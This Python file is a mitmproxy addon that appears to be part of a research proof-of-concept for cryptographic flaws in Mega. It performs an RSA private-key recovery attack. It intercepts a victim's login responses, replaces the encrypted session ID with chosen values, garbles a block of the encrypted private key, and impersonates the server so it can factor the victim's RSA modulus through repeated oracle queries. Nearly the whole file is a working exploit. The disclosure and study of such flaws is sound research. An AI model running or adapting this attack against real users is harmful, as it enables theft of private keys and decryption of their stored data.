#!/usr/bin/env sage -python

#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the RSA Key Recovery attack on Mega in a MITM setting.
# This script should be passed as argument to mitmproxy, which then intercepts
# traffic between the victim's browser and Mega, and patches the requests to
# perform the binary search attack.
#

import json
import time
import sys

from mitmproxy import http
from os.path import dirname

# This file is executed directly, which means imports are relative to this
# folder and not the root of this project. Thus, we meddle with the sys.path.
sys.path.append(dirname(dirname(__file__)))

from issue_01.rsa_key_recovery_attack import MegaRSAKeyRecoveryAttack
from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.victim import *
from shared.constants.mitmproxy import *

def log_line(l):
    with open(MITMPROXY_LOG_FILE, "a") as log_fp:
        log_fp.write(f"{l}\n")

n, e = decode_urlb64_rsa_pubk(VICTIM_PUBK_URL_B64)
pubk = (n, e)

print(f"Writing to log file {MITMPROXY_LOG_FILE}")
with open(MITMPROXY_LOG_FILE, "a+") as log_fp:
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    # Don't change this format, the PoC relies on this start header to
    # detect new runs
    log_fp.write(f"Attack start")
    log_fp.write(f"\n-------- start RSA key recovery attack {now} ----------\n")
    log_fp.write(f"Target user's public key:\nn: {n}\ne: {e}\n")

attack = MegaRSAKeyRecoveryAttack(pubk, do_ct_len_encode=True)

def request(flow: http.HTTPFlow) -> None:
    global attack
    if flow.request.method == "POST" and "sid" in flow.request.query:
        sid = url_decode(flow.request.query["sid"])
        sid_int = bytes_to_int(sid)
        #log_line(f"Intercepted SID {hex(sid_int)}")

        # If we factored n, terminate
        if attack.feed_response(sid_int):
            # Do not change the format of the following line, it is used to
            # detect when the mitmproxy finished it's attack
            log_line("Attack done")
            log_line(f"#### Factored {attack.n} = {attack.p} * {attack.q} with "
                     f"{attack.oracle_queries} oracle queries")
            return

        log_line(f"q is in the interval [{hex(attack.low)}, {hex(attack.up)}]\n")

        # Otherwise, immitate server and return a login session invalid response
        flow.response = http.Response.make(
            200,
            b"-15",
            {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                "Access-Control-Expose-Headers": "Original-Content-Length",
                "Access-Control-Max-Age": "86400",
                "Connection": "keep-alive"
            }
        )

def response(flow: http.HTTPFlow) -> None:
    global attack
    if flow.response.headers.get(b"Content-Type") == "application/json":
        d = json.loads(flow.response.text)

        if type(d) == list and hasattr(d[0], "__iter__") and "csid" in d[0]:
            #
            # Replace encrypted session ID
            #
            csid = d[0]["csid"]
            csid_p = attack.get_next_sid()
            csid_p_encoded = url_encode(csid_p).decode()
            d[0]["csid"] = csid_p_encoded

            #
            # Garble u = q^-1 mod p from the encrypted private key
            #
            privk = d[0]["privk"]
            privk_bytes = url_decode(privk)
            # Garble the second to last ciphertext block, which is an
            # intermediate block of u. We avoid the last block in case some
            # clients check the padding.
            privk_garbled_bytes = xor_bytes(
                privk_bytes,
                b"\x01",
                offset=len(privk_bytes) - AES_BLOCK_BYTE_SIZE - 1
            )
            privk_garbled_enc = url_encode(privk_garbled_bytes)
            #log_line(f"Inserted grabled encrypted privk: {privk_garbled_enc}")
            d[0]["privk"] = privk_garbled_enc.decode()

            #
            # Modify response
            #
            flow.response.text = json.dumps(d)
